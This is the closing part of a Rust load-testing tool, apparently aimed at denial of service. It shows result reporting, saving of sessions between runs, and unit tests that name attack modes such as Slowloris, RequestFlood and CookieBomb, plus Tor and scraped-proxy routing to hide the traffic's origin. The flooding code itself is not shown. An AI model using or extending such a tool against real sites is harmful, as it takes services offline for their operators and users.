                    "elapsed_secs": elapsed_secs,
                    "total_requests": final_reqs,
                    "total_bytes": final_bytes,
                    "bytes_per_second": final_bytes as f64 / elapsed_secs as f64,
                    "requests_per_second": final_reqs as f64 / elapsed_secs as f64,
                    "avg_latency_ms": final_avg_latency,
                    "p50_latency_ms": p50,
                    "p90_latency_ms": p90,
                    "p95_latency_ms": p95,
                    "p99_latency_ms": p99,
                    "status_2xx": stats.status_2xx.load(Ordering::Relaxed),
                    "status_3xx": stats.status_3xx.load(Ordering::Relaxed),
                    "status_4xx": stats.status_4xx.load(Ordering::Relaxed),
                    "status_5xx": stats.status_5xx.load(Ordering::Relaxed),
                    "status_other": stats.status_other.load(Ordering::Relaxed),
                    "errors": stats.errors.load(Ordering::Relaxed),
                    "error_timeout": stats.error_timeout.load(Ordering::Relaxed),
                    "error_connect": stats.error_connect.load(Ordering::Relaxed),
                    "error_other": stats.error_other.load(Ordering::Relaxed),
                });
                match serde_json::to_string_pretty(&json) {
                    Ok(s) => println!("{}", s),
                    Err(e) => eprintln!("Failed to serialize JSON: {}", e),
                }
            }
            // Persist sessions for next run
            {
                let sessions_data = state.lock().await;
                let sessions: Vec<String> = sessions_data.sessions.iter().map(|s| {
                    match s.lock() {
                        Ok(g) => g.clone(),
                        Err(poisoned) => poisoned.into_inner().clone(),
                    }
                }).collect();
                if let Ok(json) = serde_json::to_string(&sessions) {
                    let mut h = DefaultHasher::new();
                    h.write(target_url.as_bytes());
                    let safe_name = format!("sessions_{:x}.json", h.finish());
                    let _ = std::fs::write(&safe_name, json);
                }
            }
            
            // Write detailed report if requested
            if let Some(ref report_path) = report_file {
                let report = format!(
                    "=== Simulate Load Rust — Post-Run Report ===
                    Generated: {}
                    
                    Target: {}
                    Mode: {}
                    Attack: {}
                    Concurrency: {}
                    Duration: {}s
                    
                    Results:
                      Total Requests: {}
                      Total Bytes: {} ({:.2} MB)
                      Throughput: {:.2} KB/s | {:.2} req/s
                      
                      Latency:
                        Average: {:.1}ms
                        p50: {}ms | p90: {}ms | p95: {}ms | p99: {}ms
                        
                      Status Codes:
                        2xx: {} | 3xx: {} | 4xx: {} | 5xx: {}
                        
                      Errors: {} total
                        Timeouts: {}
                        Connection: {}
                        Other: {}
                    ",
                    format_time_now(),
                    target_url, mode_str, attack_str, concurrency, duration_secs,
                    final_reqs, final_bytes, final_bytes as f64 / 1024.0 / 1024.0,
                    final_bytes as f64 / elapsed_secs as f64 / 1024.0, final_reqs as f64 / elapsed_secs as f64,
                    final_avg_latency, p50, p90, p95, p99,
                    stats.status_2xx.load(Ordering::Relaxed),
                    stats.status_3xx.load(Ordering::Relaxed),
                    stats.status_4xx.load(Ordering::Relaxed),
                    stats.status_5xx.load(Ordering::Relaxed),
                    stats.errors.load(Ordering::Relaxed),
                    stats.error_timeout.load(Ordering::Relaxed),
                    stats.error_connect.load(Ordering::Relaxed),
                    stats.error_other.load(Ordering::Relaxed),
                );
                if let Ok(mut file) = std::fs::File::create(report_path) {
                    use std::io::Write;
                    let _ = file.write_all(report.as_bytes());
                    println!("  Report written to: {}", report_path);
                }
            }
            
            if let Some(ref path) = output_csv {
                write_results_csv(path, ResultsCsvParams {
                    target: &target_url,
                    status: &status,
                    proxies: &prox_list,
                    concurrency,
                    attack: &attack_str,
                    total_reqs: final_reqs,
                    total_bytes: final_bytes,
                    duration: elapsed_secs,
                });
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::{AttackMode, ProxyMode};

    fn rate_limit_delay_ms(rate: Option<u64>) -> u64 {
        match rate {
            Some(rate) if rate > 0 => 1000u64.saturating_div(rate),
            _ => 0,
        }
    }

    #[test]
    fn rate_limit_delay_calculation() {
        assert_eq!(rate_limit_delay_ms(Some(1)), 1000);
        assert_eq!(rate_limit_delay_ms(Some(2)), 500);
        assert_eq!(rate_limit_delay_ms(Some(1000)), 1);
        assert_eq!(rate_limit_delay_ms(Some(0)), 0);
        assert_eq!(rate_limit_delay_ms(None), 0);
        // Defense-in-depth: very large rate saturates to 0 instead of underflowing.
        assert_eq!(rate_limit_delay_ms(Some(u64::MAX)), 0);
    }

    #[test]
    fn attack_mode_case_insensitive() {
        assert_eq!(AttackMode::from_str("normal"), AttackMode::Normal);
        assert_eq!(AttackMode::from_str("NORMAL"), AttackMode::Normal);
        assert_eq!(AttackMode::from_str("Bandwidth"), AttackMode::Bandwidth);
        assert_eq!(AttackMode::from_str("BANDWIDTH"), AttackMode::Bandwidth);
        assert_eq!(AttackMode::from_str("slowread"), AttackMode::SlowRead);
        assert_eq!(AttackMode::from_str("SlowRead"), AttackMode::SlowRead);
        assert_eq!(AttackMode::from_str("imageopt"), AttackMode::ImageOpt);
        assert_eq!(AttackMode::from_str("ImageOpt"), AttackMode::ImageOpt);
        assert_eq!(AttackMode::from_str("bypasscache"), AttackMode::Normal);
        assert_eq!(AttackMode::from_str("BypassCache"), AttackMode::Normal);
        assert_eq!(AttackMode::from_str("cachebust"), AttackMode::Normal);
        assert_eq!(AttackMode::from_str("CacheBust"), AttackMode::Normal);
    }

    #[test]
    fn attack_mode_variants_full() {
        assert_eq!(AttackMode::from_str("largepost"), AttackMode::LargePost);
        assert_eq!(AttackMode::from_str("LargePost"), AttackMode::LargePost);
        assert_eq!(AttackMode::from_str("assetspray"), AttackMode::AssetSpray);
        assert_eq!(AttackMode::from_str("AssetSpray"), AttackMode::AssetSpray);
        assert_eq!(AttackMode::from_str("rangereq"), AttackMode::RangeReq);
        assert_eq!(AttackMode::from_str("RangeReq"), AttackMode::RangeReq);
        assert_eq!(AttackMode::from_str("cookiebomb"), AttackMode::CookieBomb);
        assert_eq!(AttackMode::from_str("CookieBomb"), AttackMode::CookieBomb);
        assert_eq!(AttackMode::from_str("ssr"), AttackMode::Ssr);
        assert_eq!(AttackMode::from_str("SSR"), AttackMode::Ssr);
        assert_eq!(AttackMode::from_str("middleware"), AttackMode::Middleware);
        assert_eq!(AttackMode::from_str("Middleware"), AttackMode::Middleware);
        assert_eq!(AttackMode::from_str("requestflood"), AttackMode::RequestFlood);
        assert_eq!(AttackMode::from_str("RequestFlood"), AttackMode::RequestFlood);
        assert_eq!(AttackMode::from_str("notfound"), AttackMode::NotFound);
        assert_eq!(AttackMode::from_str("NotFound"), AttackMode::NotFound);
        assert_eq!(AttackMode::from_str("slowloris"), AttackMode::Slowloris);
        assert_eq!(AttackMode::from_str("SlowLoris"), AttackMode::Slowloris);
    }

    #[test]
    fn proxy_mode_case_insensitive() {
        assert_eq!(ProxyMode::from_str("tor"), ProxyMode::Tor);
        assert_eq!(ProxyMode::from_str("TOR"), ProxyMode::Tor);
        assert_eq!(ProxyMode::from_str("Tor"), ProxyMode::Tor);
        assert_eq!(ProxyMode::from_str("scrape-tor"), ProxyMode::ScrapeTorFallback);
        assert_eq!(ProxyMode::from_str("SCRAPE-TOR"), ProxyMode::ScrapeTorFallback);
        assert_eq!(ProxyMode::from_str("Scrape-Tor"), ProxyMode::ScrapeTorFallback);
    }
}
